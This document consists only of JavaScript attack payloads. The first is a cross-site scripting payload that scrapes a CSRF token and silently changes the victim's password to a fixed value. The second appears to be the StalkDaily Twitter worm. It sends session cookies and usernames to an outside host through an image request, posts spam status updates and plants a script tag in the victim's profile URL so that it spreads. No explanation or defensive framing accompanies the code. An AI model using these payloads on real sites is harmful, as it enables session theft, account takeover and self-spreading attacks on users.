
<script>
var x = new XMLHttpRequest();
x.open("GET", "/lk", true);
x.onreadystatechange = function() {
    if (x.readyState == XMLHttpRequest.DONE) {
        text = x.responseText;
        text = text.substr(text.indexOf('invisible">') + 'invisible">'.length);
        csrf = text.substr(0, text.indexOf('</p>'));
        newdata = JSON.stringify({'new_password':'QWERTYqwerty1',confirm_password:'QWERTYqwerty1','token':csrf});
        y = new XMLHttpRequest();
        y.open("POST", "/change_password", true);
        y.setRequestHeader("Content-type", "application/json");
        y.send(newdata);
    }
};
x.send(null);
</script>

//////////////////////////////

function XHConn()
{
  var xmlhttp, bComplete = false;
  try { xmlhttp = new ActiveXObject("Msxml2.XMLHTTP"); }
  catch (e) { try { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); }
  catch (e) { try { xmlhttp = new XMLHttpRequest(); }
  catch (e) { xmlhttp = false; }}}
  if (!xmlhttp) return null;
  this.connect = function(sURL, sMethod, sVars, fnDone)
  {
    if (!xmlhttp) return false;
    bComplete = false;
    sMethod = sMethod.toUpperCase();
    try {
      if (sMethod == "GET")
      {
        xmlhttp.open(sMethod, sURL+"?"+sVars, true);
        sVars = "";
      }
      else
      {
        xmlhttp.open(sMethod, sURL, true);
        xmlhttp.setRequestHeader("Method", "POST "+sURL+" HTTP/1.1");
        xmlhttp.setRequestHeader("Content-Type",
          "application/x-www-form-urlencoded");
      }
      xmlhttp.onreadystatechange = function(){
        if (xmlhttp.readyState == 4 && !bComplete)
        {
          bComplete = true;
          fnDone(xmlhttp);
        }};
      xmlhttp.send(sVars);
    }
    catch(z) { return false; }
    return true;
  };
  return this;
}

function urlencode( str ) {           
    var histogram = {}, tmp_arr = [];
    var ret = str.toString();
    
    var replacer = function(search, replace, str) {
        var tmp_arr = [];
        tmp_arr = str.split(search);
        return tmp_arr.join(replace);
    };
    
    histogram["'"]   = '%27';
    histogram['(']   = '%28';
    histogram[')']   = '%29';
    histogram['*']   = '%2A';
    histogram['~']   = '%7E';
    histogram['!']   = '%21';
    histogram['%20'] = '+';
    
    ret = encodeURIComponent(ret);
    
    for (search in histogram) {
        replace = histogram[search];
        ret = replacer(search, replace, ret)
    }

    return ret.replace(/(\%([a-z0-9]{2}))/g, function(full, m1, m2) {
        return "%"+m2.toUpperCase();
    });
    
    return ret;
}

var content = document.documentElement.innerHTML;
userreg = new RegExp(/<meta content="(.*)" name="session-user-screen_name"/g);
var username = userreg.exec(content);
username = username[1];

var cookie;
cookie = urlencode(document.cookie);
document.write("<img src='http://mikeyylolz.uuuq.com/x.php?c=" + cookie + "&username=" + username + "'>");
document.write("<img src='http://stalkdaily.com/log.gif'>");

function wait()
{
	var content = document.documentElement.innerHTML;

	authreg = new RegExp(/twttr.form_authenticity_token = '(.*)';/g);
	var authtoken = authreg.exec(content);
	authtoken = authtoken[1];
	//alert(authtoken);
	
	var randomUpdate=new Array();
	randomUpdate[0]="Dude, www.StalkDaily.com is awesome. What's the fuss?";
	randomUpdate[1]="Join www.StalkDaily.com everyone!";
	randomUpdate[2]="Woooo, www.StalkDaily.com :)";
	randomUpdate[3]="Virus!? What? www.StalkDaily.com is legit!";
	randomUpdate[4]="Wow...www.StalkDaily.com";
	randomUpdate[5]="@twitter www.StalkDaily.com";
	
	var genRand = randomUpdate[Math.floor(Math.random()*randomUpdate.length)];
	
	updateEncode = urlencode(genRand);
	
	var xss = urlencode('http://www.stalkdaily.com"></a><script src="http://mikeyylolz.uuuq.com/x.js"></script><a ');
	
	var ajaxConn = new XHConn();
	ajaxConn.connect("/status/update", "POST", "authenticity_token="+authtoken+"&status="+updateEncode+"&tab=home&update=update");
	var ajaxConn1 = new XHConn();
	ajaxConn1.connect("/account/settings", "POST", "authenticity_token="+authtoken+"&user[url]="+xss+"&tab=home&update=update");
}
setTimeout("wait()",3250);
                    
//////////////////////////////

